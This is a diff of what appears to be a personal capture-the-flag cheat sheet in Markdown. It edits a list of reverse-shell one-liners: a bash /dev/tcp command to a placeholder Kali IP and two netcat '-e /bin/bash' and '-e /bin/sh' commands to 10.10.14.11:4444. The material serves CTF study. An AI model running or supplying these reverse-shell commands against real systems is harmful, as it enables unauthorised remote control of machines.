@@ -52,7 +52,7 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
 ## Launch shells from a terminal
 
 - Say we have a way through root and we need to get a reverse shell here are helpfuls command
-  - `echo '/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1'
+  - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
   - `nc 10.10.14.11 4444 –e /bin/bash`
   - `nc 10.10.14.11 4444 –e /bin/sh`
 
